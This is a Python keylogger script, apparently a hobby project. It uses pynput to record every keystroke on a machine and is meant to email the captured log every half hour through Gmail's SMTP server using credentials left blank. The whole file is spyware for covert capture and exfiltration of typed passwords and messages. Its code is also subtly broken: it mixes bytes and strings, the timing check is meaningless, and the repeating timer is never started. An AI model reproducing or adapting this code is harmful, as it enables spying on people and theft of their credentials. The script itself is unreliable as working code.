import pynput
import smtplib
import time
import threading
from time import localtime, strftime
from Logo import logo


print(logo)


log = ""
mail_head = ""


def listener(key):
    global log

    try:
        log = "Line :" + log + key.char.encode("UTF-8")

    except AttributeError:

        if key == key.space:
            log += " "

        elif key == key.enter:
            log += " [ENTER] "

        elif key == key.backspace:
            log += " [BACKSPACE] "

        elif key == key.ctrl_l or key == key.ctrl_r:
            log += " [CTRL] "

        elif key == key.shift or key == key.shift_r:
            log += " [SHIFT] "

        elif key == key.delete:
            log += " [DELETE] "

        elif key == key.esc:
            log += " [ESC] "

        elif key == key.tab:
            log += " [TAB] "

        elif key == key.up:
            log += " [UP] "

        elif key == key.down:
            log += " [DOWN] "

        elif key == key.left:
            log += " [LEFT] "

        elif key == key.right:
            log += " [RIGHT] "

        elif key == key.cmd or key == key.cmd_r:
            log += " [WINDOWS-KEY] "

        elif key == key.f1:
            log += " [F1] "

        elif key == key.f2:
            log += " [F2] "

        elif key == key.f3:
            log += " [F3] "

        elif key == key.f4:
            log += " [F4] "

        elif key == key.f5:
            log += " [F5] "

        elif key == key.f6:
            log += " [F6] "

        elif key == key.f7:
            log += " [F7] "

        elif key == key.f8:
            log += " [F8] "

        elif key == key.f9:
            log += " [F9] "

        elif key == key.f10:
            log += " [F10] "

        elif key == key.f11:
            log += " [F11] "

        elif key == key.f12:
            log += " [F12] "

        elif key == key.alt_l or key == key.alt_r:
            log += " [ALT] "

        elif key == key.caps_lock:
            log += " [CAPSLOCK] "

        elif key == key.home:
            log += " [HOME] "

        else:
            log += " " + str(key) + " "


def hour_wait():
    global mail_head

    start = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    x = 1800
    time.sleep(x)

    finish = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    if int(int(finish[17]) - int(start[17])) == x:
        mail_head = finish


def mail_send(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def thread_all():
    global log
    global mail_head

    log_msg = (f"""
    Date : {mail_head} \n\n

Captured : {log}
""")

    mail_send("", "", log_msg)
    log = ""

    threading.Timer(1800, thread_all)


keylogger = pynput.keyboard.Listener(on_press=listener)

with keylogger:
    keylogger.join()
    hour_wait()
    thread_all()
